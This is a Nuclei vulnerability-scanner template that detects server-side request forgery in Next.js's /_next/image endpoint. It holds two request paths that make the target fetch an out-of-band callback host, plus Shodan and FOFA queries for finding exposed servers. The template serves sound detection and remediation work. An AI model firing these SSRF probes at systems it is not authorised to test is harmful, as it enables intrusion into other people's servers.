id: next-js-misconfiguration-ssrf

info:
  name: Next.js - Server Side Request Forgery (SSRF)
  author: righettod
  severity: high
  remediation: Upgrade to Next.js version 14.1.1 or higher.
  reference:
    - https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps
  metadata:
    max-request: 2
    product: next.js
    shodan-query:
      - http.html:"/_next/static"
      - cpe:"cpe:2.3:a:zeit:next.js"
    fofa-query: body="/_next/static"
  tags: vercel,next-js,ssrf

http:
  - method: GET
    path:
      - '{{BaseURL}}/_next/image?w=16&q=10&url=http://{{interactsh-url}}'
      - '{{BaseURL}}/_next/image?w=16&q=10&url=https://{{interactsh-url}}'

    stop-at-first-match: true
    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - 'http'

      - type: word
        part: body
        words:
          - "The requested resource isn't a valid image"
# digest: 4a0a0047304502201cb22b31416f184c4beeafb402db2f170f661e1cb990d6fd5ab034d847bfa51c022100fdeb601572c1a7b843247ef5294a0243a39df1a90310dcb0fc97a3edd48bde6f:922c64590222798bb761d5b6d8e72950
